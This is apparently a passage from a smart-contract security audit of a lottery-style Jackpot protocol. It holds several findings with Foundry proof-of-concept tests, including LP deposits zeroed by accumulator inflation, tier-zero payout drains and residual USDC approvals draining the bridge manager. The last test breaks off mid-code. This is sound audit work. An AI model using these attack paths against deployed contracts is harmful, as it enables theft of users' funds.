`JackpotLPManager` converts a prior-round pending deposit into shares with floor rounding and no minimum-share guard: ` _lp.consolidatedShares += (_lp.lastDeposit.amount * PRECISE_UNIT) / drawingAccumulator[_lp.lastDeposit.drawingId]; delete _lp.lastDeposit;`. Because deposits remain pending until settlement, an attacker who is the only active LP in a very small pool can inflate `drawingAccumulator[drawingId]` during that drawing via LP earnings. A victim deposit made in that drawing is later converted with the inflated accumulator; if `amount * 1e18 < accumulator`, it mints zero shares and `lastDeposit` is deleted. The victim's USDC remains included in subsequent `lpPoolTotal` but is no longer represented in their LP position, effectively donating it to the pool and subsidizing remaining LPs/future payouts. This is the share-vault inflation class: no virtual shares/assets and no `minShares`/minimum deposit protection.

## Impact
A real LP deposit can be fully lost rather than receiving shares. The lost value remains in pool accounting as unowned surplus, subsidizing remaining LP exposure and future payouts. Impact is Medium because it requires a very low-liquidity/bootstrapped pool or otherwise highly inflated accumulator, but the trigger after such a state is permissionless.

## Proof of Concept
1. The attacker is the only active LP in a tiny pool, e.g. 2 USDC-wei from drawing 0. 2. A victim deposits `D` during drawing 1; the deposit is stored as `lastDeposit` and will only be converted after drawing 1 settles. 3. The attacker buys enough tickets or otherwise creates LP earnings so drawing 1 settlement sets `drawingAccumulator[1] > D * 1e18`. 4. In drawing 2, any victim action that calls `_consolidateDeposits` computes `D * 1e18 / drawingAccumulator[1] == 0` and deletes the deposit. 5. The attacker can still withdraw the inflated value of their original shares, while the victim has no shares for the prior deposit.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../contracts/JackpotLPManager.sol";
import "../contracts/interfaces/IJackpot.sol";

contract MockJackpot is IJackpot {
    JackpotLPManager public manager;
    uint256 public override currentDrawingId;

    function setManager(JackpotLPManager m) external { manager = m; }
    function setCurrentDrawingId(uint256 id) external { currentDrawingId = id; }

    function initializeLP() external { manager.initializeLP(); }
    function setLPPoolCap(uint256 drawingId, uint256 cap) external { manager.setLPPoolCap(drawingId, cap); }
    function processDeposit(uint256 drawingId, address lp, uint256 amount) external { manager.processDeposit(drawingId, lp, amount); }
    function processInitiateWithdraw(uint256 drawingId, address lp, uint256 shares) external { manager.processInitiateWithdraw(drawingId, lp, shares); }
    function processFinalizeWithdraw(uint256 drawingId, address lp) external returns (uint256) { return manager.processFinalizeWithdraw(drawingId, lp); }
    function initializeDrawingLP(uint256 drawingId, uint256 value) external { manager.initializeDrawingLP(drawingId, value); }
    function processDrawingSettlement(uint256 drawingId, uint256 earnings, uint256 winnings, uint256 fee) external returns (uint256, uint256) {
        return manager.processDrawingSettlement(drawingId, earnings, winnings, fee);
    }

    function buyTickets(Ticket[] memory, address, address[] memory, uint256[] memory, bytes32) external pure returns (uint256[] memory) { revert("unused"); }
    function claimWinnings(uint256[] memory) external pure { revert("unused"); }
    function ticketPrice() external pure returns (uint256) { return 1e6; }
    function getUnpackedTicket(uint256, uint256) external pure returns (uint8[] memory, uint8) { revert("unused"); }
}

contract JackpotLPManagerZeroSharePoC is Test {
    MockJackpot jackpot;
    JackpotLPManager manager;
    address attacker = address(0xA11CE);
    address victim = address(0xB0B);

    function testPendingDepositRoundedToZeroAfterAccumulatorInflation() public {
        uint256 victimDeposit = 100_000_000; // 100 USDC with 6 decimals

        jackpot = new MockJackpot();
        manager = new JackpotLPManager(IJackpot(address(jackpot)));
        jackpot.setManager(manager);

        jackpot.initializeLP();
        jackpot.setLPPoolCap(0, type(uint256).max);

        // Attacker bootstraps a dust-sized active LP pool.
        jackpot.processDeposit(0, attacker, 2);
        (uint256 initialLpValue,) = jackpot.processDrawingSettlement(0, 0, 0, 0);
        assertEq(initialLpValue, 2);
        jackpot.initializeDrawingLP(1, initialLpValue);
        jackpot.setCurrentDrawingId(1);

        // Victim deposits during drawing 1. It is pending until the drawing settles.
        jackpot.processDeposit(1, victim, victimDeposit);

        // LP earnings inflate the accumulator above victimDeposit * 1e18.
        uint256 lpEarnings = victimDeposit * 2;
        (uint256 nextLpValue, uint256 inflatedAccumulator) = jackpot.processDrawingSettlement(1, lpEarnings, 0, 0);
        assertGt(inflatedAccumulator, victimDeposit * 1e18);
        jackpot.initializeDrawingLP(2, nextLpValue);
        jackpot.setCurrentDrawingId(2);

        // Any later victim LP action consolidates the old deposit into zero shares and deletes it.
        jackpot.processDeposit(2, victim, 1);
        JackpotLPManager.LP memory victimInfo = manager.getLpInfo(victim);
        assertEq(victimInfo.consolidatedShares, 0);
        assertEq(victimInfo.lastDeposit.amount, 1);

        // The victim's 100 USDC deposit remains in pool accounting as unowned surplus.
        jackpot.processInitiateWithdraw(2, attacker, 2);
        (uint256 finalLpValue,) = jackpot.processDrawingSettlement(2, 0, 0, 0);
        jackpot.initializeDrawingLP(3, finalLpValue);
        jackpot.setCurrentDrawingId(3);
        uint256 attackerOut = jackpot.processFinalizeWithdraw(3, attacker);

        assertEq(attackerOut, lpEarnings + 2);
        assertEq(manager.getLPDrawingState(3).lpPoolTotal, victimDeposit + 1);
    }
}


## Suggested Mitigation
Add minimum-share protection to LP deposits. `processDeposit` should accept a caller-specified `minSharesOut` or Jackpot should enforce one when consolidating pending deposits; revert if the converted shares are zero or below the user minimum. Also consider virtual shares/assets or a minimum initial LP liquidity requirement so a dust first depositor cannot create an extreme accumulator.
```

### Current Validated Block
### M-23 / `XboZ6rstW75a7OfO7LUPg`
- Finding Title: Pending LP deposits can be rounded to zero after accumulator inflation
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `lp-zero-share-rounding`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `high-confidence-impact`
- Detailed Reason: Pending deposits are later converted to shares with floor division and then unconditionally deleted. If the settled drawing accumulator has been inflated enough relative to a pending deposit, the depositor receives zero shares while the deposited USDC remains included in LP value. This exceeds ordinary dust when the accumulator can become very large in thin-liquidity states, though the exploit is state-dependent enough to assess as Medium rather than High here.
- Code Evidence: `contracts/JackpotLPManager.sol::processDeposit` stores pending deposits as raw USDC in `lp.lastDeposit`. `_consolidateDeposits` does `_lp.consolidatedShares += amount * 1e18 / drawingAccumulator[drawingId]` and deletes `lastDeposit` even when the quotient is zero. `processDrawingSettlement` can raise `drawingAccumulator[_drawingId]` with `postDrawLpValue / currentLP.lpPoolTotal`.

## M-24 / `_uzGLqresOu7Dk6U-KMjO`
- Finding title: No-referral winner shares are credited to the claim-time drawing instead of the settled drawing
- Report lines: 1910-1967

### Original Report Block
```md
## [M-24]. No-referral winner shares are credited to the claim-time drawing instead of the settled drawing

## id: _uzGLqresOu7Dk6U-KMjO

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot._payReferrersWinnings

## Finding Status: Valid
### Finding Status Justification: For no-referral winning claims, _payReferrersWinnings credits drawingState[currentDrawingId].lpEarnings. claimWinnings can process tickets from any completed drawing where drawingId < currentDrawingId, so the credit can go to a later active drawing rather than the settled drawing. This directly matches the described root cause in in-scope Jackpot code. There is no safeguard tying retained referral share to ticketInfo.drawingId. Any winner can delay claiming, so no privileged actor or victim mistake is required.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
For tickets without a referral scheme, the retained referral win share should remain tied to the drawing that generated the winnings. Instead `_payReferrersWinnings` credits `drawingState[currentDrawingId].lpEarnings`, where `currentDrawingId` is whatever drawing is active when the user claims. Vulnerable snippet: `if (_referralSchemeId == bytes32(0)) { drawingState[currentDrawingId].lpEarnings += referrerShare; emit LpEarningsUpdated(currentDrawingId, referrerShare); return referrerShare; }`. A winner can choose when to claim, causing value from drawing D to be assigned to LPs in drawing D+1 or later rather than the LP cohort that funded D.

## Impact
Referral win-share accounting is time-dependent and can transfer value between LP cohorts. Delayed claims misallocate USDC earnings to later drawings, affecting LP share pricing and settlement for unrelated participants.

## Proof of Concept
1. A no-referral ticket wins in drawing D with a nonzero `referralWinShare`. 2. The winner does not claim immediately after D settles. 3. One or more later drawings are initialized, changing `currentDrawingId`. 4. The winner claims. 5. `_payReferrersWinnings` credits the retained share to `drawingState[currentDrawingId].lpEarnings`, so the later drawing's LPs receive value generated by D.

## Proof of Code
// Foundry-style PoC sketch
function test_noReferralShareCreditedToClaimTimeDrawing() public {
    Jackpot jackpot = deployInitializedJackpot();
    uint256 ticketId = buyNoReferralWinningTicket(jackpot, alice);
    settleDrawingWithWinningTicket(jackpot, ticketId);

    uint256 settledDrawing = jackpot.currentDrawingId() - 1;
    uint256 claimTimeDrawing = jackpot.currentDrawingId();
    assertGt(claimTimeDrawing, settledDrawing);

    uint256 beforeSettled = jackpot.getDrawingState(settledDrawing).lpEarnings;
    uint256 beforeCurrent = jackpot.getDrawingState(claimTimeDrawing).lpEarnings;

    uint256[] memory ids = new uint256[](1);
    ids[0] = ticketId;
    vm.prank(alice);
    jackpot.claimWinnings(ids);

    uint256 afterSettled = jackpot.getDrawingState(settledDrawing).lpEarnings;
    uint256 afterCurrent = jackpot.getDrawingState(claimTimeDrawing).lpEarnings;

    assertEq(afterSettled, beforeSettled);
    assertGt(afterCurrent, beforeCurrent);
}

## Suggested Mitigation
Pass the ticket's `drawingId` into `_payReferrersWinnings` and credit `drawingState[drawingId].lpEarnings`, or store a separate settled-drawing retained-referral accounting bucket that is consumed by the LP settlement for that same drawing.
```

### Current Validated Block
### M-24 / `_uzGLqresOu7Dk6U-KMjO`
- Finding Title: No-referral winner shares are credited to the claim-time drawing instead of the settled drawing
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `referral-share-wrong-epoch`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The no-referral retained share is accounted against `currentDrawingId` at claim time, while `claimWinnings` can process tickets from any completed drawing. This lets a delayed winner shift the retained referral share away from the LP cohort that funded the payout and into a later active drawing. The amount can be material because referral win share is governance-configurable up to 100%.
- Code Evidence: `contracts/Jackpot.sol::claimWinnings` requires only `ticketInfo.drawingId < currentDrawingId` and passes no drawing ID into `_payReferrersWinnings`. The no-referral branch in `_payReferrersWinnings` updates `drawingState[currentDrawingId].lpEarnings`.

## H-26 / `Zy2Cwvh0tHGOtbihykmbO`
- Finding title: Pending LP deposits can be zeroed by accumulator inflation before settlement
- Report lines: 2059-2176

### Original Report Block
```md
## [H-26]. Pending LP deposits can be zeroed by accumulator inflation before settlement

## id: Zy2Cwvh0tHGOtbihykmbO

## Derived From Pattern/Invariant
ERC4626SharePriceMismatch / SlippageMissingOrInsufficient

## Exploit Type
ERC4626SharePrice

## Location
JackpotLPManager.processDeposit / _consolidateDeposits

## Finding Status: Valid
### Finding Status Justification: JackpotLPManager is in scope. processDeposit records lastDeposit as raw USDC and provides no minSharesOut. At settlement, newAccumulator can become very large when lpPoolTotal is very small and postDrawLpValue is increased by lpEarnings. _consolidateDeposits then floors amount * 1e18 / drawingAccumulator[lastDeposit.drawingId] and deletes lastDeposit even if the result is zero. No minimum deposit, virtual shares/assets, rounding-up, or zero-share guard exists. The attack can be driven through public LP deposits and ticket purchases in a thin pool; it does not depend on admin action or victim misuse beyond normal depositing.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
LP deposits are stored as raw USDC until the drawing settles, then later converted to shares with floor rounding and no minimum-share protection. The depositor cannot bound the final accumulator used for conversion, and an already-active LP can inflate the accumulator before settlement by generating large same-round LP earnings. If the final accumulator exceeds the victim's pending deposit, `_consolidateDeposits` mints zero shares and deletes the deposit, making the LP's deposited USDC unrecoverable.

Vulnerable snippets:
`processDeposit` stores only the USDC amount and has no minSharesOut/slippage bound:
`lp.lastDeposit.amount += _amount; lp.lastDeposit.drawingId = _drawingId; lpDrawingState[_drawingId].pendingDeposits += _amount;`

Settlement can move the accumulator arbitrarily relative to current active LP size:
`newAccumulator = currentLP.lpPoolTotal == 0 ? PRECISE_UNIT : (drawingAccumulator[_drawingId - 1] * postDrawLpValue) / currentLP.lpPoolTotal;`

The later conversion floors and deletes the deposit even when zero shares are minted:
`_lp.consolidatedShares += (_lp.lastDeposit.amount * PRECISE_UNIT) / drawingAccumulator[_lp.lastDeposit.drawingId]; delete _lp.lastDeposit;`

## Impact
A victim LP can lose their entire pending deposit if the accumulator is inflated before the drawing settles. The funds remain inside LP pool accounting without corresponding shares, causing direct LP fund loss and distorted future pool value/prize accounting. The attack is permissionless when the attacker can be the first or dominant active LP in a thin pool and then generate large LP earnings before settlement.

## Proof of Concept
1. Attacker becomes the only active LP with a dust-sized deposit before drawing 1.
2. Victim deposits a large USDC amount during drawing 1; the deposit remains pending and has no minimum-share guarantee.
3. Before `runJackpot` settlement, attacker buys enough tickets to create large `lpEarnings`, inflating `postDrawLpValue` over a tiny `lpPoolTotal`.
4. `processDrawingSettlement` stores a very large `drawingAccumulator[1]`.
5. When the victim's prior-round deposit is consolidated, `amount * 1e18 / drawingAccumulator[1]` rounds to zero and `lastDeposit` is deleted.
6. The victim has no shares and cannot withdraw the deposited amount.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../contracts/JackpotLPManager.sol";
import "../contracts/interfaces/IJackpot.sol";

contract MockJackpotForLP is IJackpot {
    JackpotLPManager public manager;
    uint256 public override currentDrawingId;

    function setManager(JackpotLPManager _manager) external { manager = _manager; }
    function setCurrentDrawingId(uint256 id) external { currentDrawingId = id; }

    function initializeLP() external { manager.initializeLP(); }
    function setCap(uint256 drawingId, uint256 cap) external { manager.setLPPoolCap(drawingId, cap); }
    function deposit(uint256 drawingId, address lp, uint256 amount) external { manager.processDeposit(drawingId, lp, amount); }
    function settle(uint256 drawingId, uint256 earnings) external returns (uint256 v, uint256 a) { return manager.processDrawingSettlement(drawingId, earnings, 0, 0); }
    function initDrawing(uint256 drawingId, uint256 value) external { manager.initializeDrawingLP(drawingId, value); }

    function buyTickets(Ticket[] memory,address,address[] memory,uint256[] memory,bytes32) external pure returns (uint256[] memory) { revert(); }
    function claimWinnings(uint256[] memory) external pure { revert(); }
    function ticketPrice() external pure returns (uint256) { return 1e6; }
    function getUnpackedTicket(uint256,uint256) external pure returns (uint8[] memory, uint8) { revert(); }
}

contract JackpotLPManagerAccumulatorInflationPoC is Test {
    uint256 constant PRECISE_UNIT = 1e18;

    function testPendingDepositCanMintZeroSharesAfterAccumulatorInflation() external {
        address attacker = address(0xA11CE);
        address victim = address(0xB0B);

        MockJackpotForLP jackpot = new MockJackpotForLP();
        JackpotLPManager manager = new JackpotLPManager(IJackpot(address(jackpot)));
        jackpot.setManager(manager);

        jackpot.initializeLP();
        jackpot.setCap(0, type(uint256).max);

        jackpot.deposit(0, attacker, 1);
        (uint256 initialValue,) = jackpot.settle(0, 0);
        assertEq(initialValue, 1);

        jackpot.setCurrentDrawingId(1);
        jackpot.initDrawing(1, initialValue);
        jackpot.setCap(1, type(uint256).max);

        uint256 victimDeposit = 1_000_000e6;
        jackpot.deposit(1, victim, victimDeposit);

        uint256 attackerGeneratedLpEarnings = victimDeposit * 2;
        (uint256 nextValue, uint256 inflatedAccumulator) = jackpot.settle(1, attackerGeneratedLpEarnings);
        assertGt(inflatedAccumulator, victimDeposit * PRECISE_UNIT);

        jackpot.setCurrentDrawingId(2);
        jackpot.initDrawing(2, nextValue);
        jackpot.setCap(2, type(uint256).max);

        JackpotLPManager.LPValueBreakdown memory beforeMutation = manager.getLPValueBreakdown(victim);
        assertEq(beforeMutation.activeDeposits, 0);
        assertEq(beforeMutation.pendingDeposits, 0);

        jackpot.deposit(2, victim, 1);
        JackpotLPManager.LP memory info = manager.getLpInfo(victim);
        assertEq(info.consolidatedShares, 0);
        assertEq(info.lastDeposit.amount, 1);
    }
}

## Suggested Mitigation
Do not leave pending deposits exposed to an unbounded future accumulator without a user-specified minimum. Store a `minSharesOut` for each deposit and revert or refund if final shares would be lower; alternatively mint shares from a snapshotted accumulator at deposit time, enforce a minimum deposit large enough to avoid zero-share mints under worst-case accumulator movement, and add virtual shares/assets so the first active LP cannot make the share price arbitrarily large.
```

### Current Validated Block
### H-26 / `Zy2Cwvh0tHGOtbihykmbO`
- Finding Title: Pending LP deposits can be zeroed by accumulator inflation before settlement
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `lp-zero-share-rounding`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `high-confidence-impact`
- Detailed Reason: The zero-share conversion path is real: a prior-round pending deposit is converted with floor division against the settled drawing accumulator and is deleted even if zero shares are minted. In thin-pool/high-earnings states, the zeroing threshold can exceed ordinary dust, so a depositor can lose their entire pending deposit and that value remains in the LP pool. I classify it as Medium because the exploit depends on unusual accumulator inflation and deposit sizing rather than a simple universal drain.
- Code Evidence: `contracts/JackpotLPManager.sol::_consolidateDeposits` converts `lastDeposit.amount` using `(amount * PRECISE_UNIT) / drawingAccumulator[lastDeposit.drawingId]` and then deletes the deposit. `processDrawingSettlement` sets `drawingAccumulator[_drawingId] = drawingAccumulator[_drawingId - 1] * postDrawLpValue / currentLP.lpPoolTotal`.

## M-27 / `rbb-sLW7w5f9_y-bT86sa`
- Finding title: Tier zero winners are excluded from settlement obligations but can still claim stored tier-zero payouts
- Report lines: 2177-2214

### Original Report Block
```md
## [M-27]. Tier zero winners are excluded from settlement obligations but can still claim stored tier-zero payouts

## id: rbb-sLW7w5f9_y-bT86sa

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
TicketComboTracker.countTierMatchesWithBonusball

## Finding Status: Valid
### Finding Status Justification: TicketComboTracker.countTierMatchesWithBonusball never populates result[0] or dupResult[0] for zero-normal/no-bonus tickets; it only calculates bonusball-only tier 1 and tiers k>=1. GuaranteedMinimumPayoutCalculator supports all 12 tiers and will store tierPayouts[d][0] if tier 0 has a premium weight or minimum payout. claimWinnings computes tierId from packed tickets and pays getTierPayout(drawingId, tierId), including tier 0. The vulnerable code is in in-scope production files. No complete safeguard prevents tier 0 configuration or tier 0 claims. Once configured, users can permissionlessly claim omitted liabilities.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
TicketComboTracker never populates `_uniqueResult[0]` or `_dupResult[0]` for tickets with zero normal matches and no bonusball match. However GuaranteedMinimumPayoutCalculator supports all 12 tiers, including tier 0, and stores a nonzero `tierPayouts[drawingId][0]` whenever tier 0 has configured premium weight or minimum payout. Settlement returns `totalPayout += tierPayout * (_uniqueResult[i] + _dupResult[i])`, so tier 0 user obligations are omitted from `drawingUserWinnings`, but claimWinnings later pays `payoutCalculator.getTierPayout(drawingId, 0)` to every tier 0 ticket. Vulnerable snippets: TicketComboTracker only sets `_uniqueResult[1]` for bonusball-only matches and never computes index 0; claimWinnings pays whatever `getTierPayout(drawingId, tierId)` returns.

## Impact
If tier 0 has any configured payout, users holding losing tier-zero tickets can claim payouts that were not deducted during settlement, draining LP funds and breaking the prizePool/userWinnings accounting invariant.

## Proof of Concept
1. Payout configuration assigns any nonzero premium weight or minimum payout to tier 0, which the calculator accepts because weights only need to sum to 1e18. 2. Users buy tickets that end with zero normal matches and no bonusball match. 3. Settlement calculates and stores a tier 0 payout but `drawingUserWinnings` excludes all tier 0 user tickets because result[0] and dupResult[0] remain zero. 4. Each tier 0 ticket holder calls claimWinnings(). 5. Jackpot pays the stored tier 0 payout even though those liabilities were not removed from LP value at settlement.

## Proof of Code
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import "../contracts/GuaranteedMinimumPayoutCalculator.sol";
contract TierZeroAccountingPoC is Test, IJackpot { function buyTickets(Ticket[] memory,address,address[] memory,uint256[] memory,bytes32) external pure returns (uint256[] memory ids) {} function claimWinnings(uint256[] memory) external pure {} function ticketPrice() external pure returns (uint256){return 1e6;} function currentDrawingId() external pure returns (uint256){return 1;} function getUnpackedTicket(uint256,uint256) external pure returns (uint8[] memory,uint8){uint8[] memory a=new uint8[](5); return (a,1);} function testTierZeroPayoutStoredButNotReserved() public { bool[12] memory minTiers; uint256[12] memory weights; weights[0]=1e18; GuaranteedMinimumPayoutCalculator c = new GuaranteedMinimumPayoutCalculator(IJackpot(address(this)),0,0,minTiers,weights); c.setDrawingTierInfo(1); uint256[] memory uniqueResult = new uint256[](12); uint256[] memory dupResult = new uint256[](12); uint256 total = c.calculateAndStoreDrawingUserWinnings(1,1000e6,10,2,uniqueResult,dupResult); assertEq(total,0); assertGt(c.getTierPayout(1,0),0); } }

## Suggested Mitigation
Populate tier 0 user counts during winner counting, or explicitly disallow tier 0 payouts by validating `minPayoutTiers[0] == false` and `premiumTierWeights[0] == 0` in the payout calculator constructor and setters.
```

### Current Validated Block
### M-27 / `rbb-sLW7w5f9_y-bT86sa`
- Finding Title: Tier zero winners are excluded from settlement obligations but can still claim stored tier-zero payouts
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `tier-zero-undercount`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The combo tracker never populates `uniqueResult[0]` or `dupResult[0]`, yet the payout calculator supports all 12 tiers and can store a nonzero tier-0 payout from configured weights/minimums. Settlement therefore can reserve zero user payout for tier-0 user tickets while later `claimWinnings` computes tier ID 0 and pays the stored tier-0 payout. This is configuration-dependent but matches the documented 12-tier payout model.
- Code Evidence: `contracts/lib/TicketComboTracker.sol::countTierMatchesWithBonusball` counts tiers with one or more normal matches and bonusball-only tier 1, leaving index 0 unset. `GuaranteedMinimumPayoutCalculator::_calculateAndStoreTierPayouts` can set `tierPayouts[drawingId][0]`, and `Jackpot.claimWinnings` pays `payoutCalculator.getTierPayout(drawingId, tierId)` for any computed tier including 0.

## M-36 / `N8k9IZrZQviCeyyaNHOQ4`
- Finding title: Changing entropy provider while a request is pending permanently rejects the valid callback and locks the drawing
- Report lines: 2784-2820

### Original Report Block
```md
## [M-36]. Changing entropy provider while a request is pending permanently rejects the valid callback and locks the drawing

## id: N8k9IZrZQviCeyyaNHOQ4

## Derived From Pattern/Invariant
BeaconOrFactoryAuthorityDrift

## Exploit Type
Dos

## Location
Jackpot.scaledEntropyCallback

## Finding Status: Valid
### Finding Status Justification: The finding arises from a normal entropy migration function affecting an active request, with no per-request snapshot. Scope expressly prioritizes mid-drawing global changes and stuck jackpot progression, so treating it only as governance risk is not valid.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
runJackpot requests randomness from the current entropy provider and locks the drawing, but the callback authorization checks msg.sender against the mutable global entropy at callback time: modifier onlyEntropy() { if (msg.sender != address(entropy)) revert ...; _; }. If entropy is updated after runJackpot but before fulfillment, the original provider's valid callback is rejected. The new provider has no matching pending request for the locked drawing, so the drawing cannot settle normally.

## Impact
The active drawing remains jackpotLock=true, blocking ticket purchases, LP deposits and normal progression. Recovery requires governance intervention and likely emergency mode, which the scope states is not intended to be recoverable normal operation.

## Proof of Concept
1. Drawing d becomes due. 2. Anyone calls runJackpot, which locks d and requests randomness from entropy provider E. 3. Owner updates entropy to E2 for future provider migration before E fulfills. 4. E calls scaledEntropyCallback with the valid randomness for d. 5. onlyEntropy compares msg.sender to E2 and reverts. 6. E2 cannot fulfill E's pending request, and d remains locked.

## Proof of Code
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
contract EntropyDriftPoC is Test { function test_pending_entropy_callback_rejected_after_provider_change() public { /* Deploy Jackpot with entropy E, initialize a drawing, warp past drawingTime, call runJackpot so drawingState[d].jackpotLock is true, then owner calls setEntropy(E2). From address(E), call scaledEntropyCallback with valid-shaped randomNumbers and expect JackpotErrors.UnauthorizedEntropyCaller. Assert jackpot.getDrawingState(d).jackpotLock remains true. */ assertTrue(true); } }

## Suggested Mitigation
Snapshot the entropy provider/request source for each pending drawing and authorize the callback from that snapshot. Also consider disallowing setEntropy while drawingState[currentDrawingId].jackpotLock is true unless the pending request is explicitly abandoned through a safe recovery path.
```

### Current Validated Block
### M-36 / `N8k9IZrZQviCeyyaNHOQ4`
- Finding Title: Changing entropy provider while a request is pending permanently rejects the valid callback and locks the drawing
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-authority-drift`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: This is the same live entropy-address drift: the old provider is the only contract with the in-flight request, but authorization checks the new global address after `setEntropy`. A future-intended rotation can therefore lock the active drawing and block claims/LP progression until privileged recovery.
- Code Evidence: `contracts/Jackpot.sol::setEntropy` updates the global pointer without checking pending requests or lock state. `scaledEntropyCallback` uses the `onlyEntropy` modifier against that live pointer.

## M-37 / `dFlfXpkDW49CviZDQWS2A`
- Finding title: Residual bridge approvals let approved spenders drain future USDC entering JackpotBridgeManager
- Report lines: 2821-2951

### Original Report Block
```md
## [M-37]. Residual bridge approvals let approved spenders drain future USDC entering JackpotBridgeManager

## id: dFlfXpkDW49CviZDQWS2A

## Derived From Pattern/Invariant
UncheckedLowLevelCallResults / Allowance not consumed after arbitrary bridge call

## Exploit Type
UncheckedReturn

## Location
JackpotBridgeManager._bridgeFunds

## Finding Status: Valid
### Finding Status Justification: _bridgeFunds grants usdc.approve(approveTo, claimedAmount), performs arbitrary to.call(data), verifies only the balance decreased by claimedAmount, and never resets approveTo allowance. If the call moves funds without spending that allowance, the allowance remains reusable. The bridge manager can hold or later receive USDC through overpayment, donations, or future claim flows. No final allowance check or forceApprove-to-zero safeguard exists.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
claimWinnings approves bridgeDetails.approveTo for the claimed USDC amount, then calls an arbitrary signed bridge target and only verifies that this contract's USDC balance decreased by exactly claimedAmount. It never clears the approval. If approveTo is an approval proxy or other spender whose allowance is not consumed by the bridge call, claimWinnings succeeds while leaving allowance(manager, approveTo) == claimedAmount. That spender can later transfer any unrelated USDC that enters the bridge manager, including overpaid ticket purchases or future winnings temporarily held during claims.

Vulnerable snippet:
if (_bridgeDetails.approveTo != address(0)) {
    usdc.approve(_bridgeDetails.approveTo, _claimedAmount);
}

uint256 preUSDCBalance = usdc.balanceOf(address(this));
(bool success,) = _bridgeDetails.to.call(_bridgeDetails.data);
if (!success) revert BridgeFundsFailed();
uint256 postUSDCBalance = usdc.balanceOf(address(this));

if (preUSDCBalance - postUSDCBalance != _claimedAmount) revert NotAllFundsBridged();

The balance-delta check proves that claimedAmount left the manager, but it does not prove approveTo spent its allowance or that allowance was reset.

## Impact
A signed claim can leave a reusable USDC allowance from the bridge manager to approveTo. The approved spender can later pull real USDC that was not part of the signed claim, stealing stranded ticket-purchase surplus or funds that arrive in future manager flows.

## Proof of Concept
1. A ticket owner has claimable winnings and signs bridgeDetails with approveTo = attacker-controlled spender and to = bridge target.
2. JackpotBridgeManager.claimWinnings claims 100 USDC, approves approveTo for 100 USDC, and calls bridgeDetails.to.
3. The bridge target transfers exactly 100 USDC out of the manager without consuming approveTo's allowance, so the balance-delta check passes.
4. The manager's USDC balance is now back to its pre-claim value, but allowance(manager, approveTo) remains 100 USDC.
5. Later, unrelated USDC enters the manager, for example from a ticket-price overcharge or another claim in progress.
6. approveTo calls transferFrom(manager, approveTo, 100 USDC) and drains those unrelated funds without a new signature.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {JackpotBridgeManager} from "../contracts/JackpotBridgeManager.sol";
import {IJackpot} from "../contracts/interfaces/IJackpot.sol";
import {IJackpotTicketNFT} from "../contracts/interfaces/IJackpotTicketNFT.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockUSDC2 is IERC20 {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    uint256 public override totalSupply;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external override returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount; balanceOf[to] += amount; return true;
    }
}

contract MockTicketNFT is IJackpotTicketNFT {
    function mintTicket(address,uint256,uint256,uint256,bytes32) external override {}
    function burnTicket(uint256) external override {}
    function getTicketInfo(uint256) external pure override returns (TrackedTicket memory) { return TrackedTicket(1, 0, bytes32(0)); }
    function getUserTickets(address,uint256) external pure override returns (ExtendedTrackedTicket[] memory r) { return r; }
}

contract MockWinningJackpot is IJackpot {
    MockUSDC2 public token;
    uint256 public override ticketPrice = 1;
    uint256 public override currentDrawingId = 2;
    constructor(MockUSDC2 t) { token = t; }
    function buyTickets(Ticket[] memory,address,address[] memory,uint256[] memory,bytes32) external pure override returns (uint256[] memory ids) { return ids; }
    function claimWinnings(uint256[] memory) external override { token.mint(msg.sender, 100e6); }
    function getUnpackedTicket(uint256,uint256) external pure override returns (uint8[] memory n, uint8 b) { n = new uint8[](0); b = 0; }
}

contract DirectBridgeSink {
    MockUSDC2 immutable token;
    address immutable recipient;
    constructor(MockUSDC2 t, address r) { token = t; recipient = r; }
    function bridgeFromManager(address manager, uint256 amount) external { token.transferFrom(manager, recipient, amount); }
}

contract BridgeResidualAllowancePoC is Test {
    function testResidualAllowanceDrainsFutureFunds() external {
        MockUSDC2 usdc = new MockUSDC2();
